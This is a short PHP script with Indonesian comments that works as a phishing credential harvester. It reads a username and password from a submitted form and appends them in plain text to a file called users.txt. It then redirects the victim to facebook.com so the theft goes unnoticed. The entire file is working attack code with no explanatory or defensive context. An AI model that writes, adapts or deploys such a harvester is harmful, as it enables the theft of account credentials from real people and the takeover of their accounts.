<?php
// Mengatur lokasi file penyimpanan
$filename = 'users.txt';

// Mengambil data dari form
$username = htmlspecialchars($_POST['username']);
$password = htmlspecialchars($_POST['password']);

// Membuka file untuk ditulis
$file = fopen($filename, 'a');

// Menyimpan data ke dalam file
if ($file) {
    $data = "Username: $username, Password: $password\n";
    fwrite($file, $data);
    fclose($file);

    // Mengarahkan ke aplikasi Facebook
    header('Location: https://www.facebook.com');
    exit();
} else {
    echo "Gagal membuka file.";
}
?>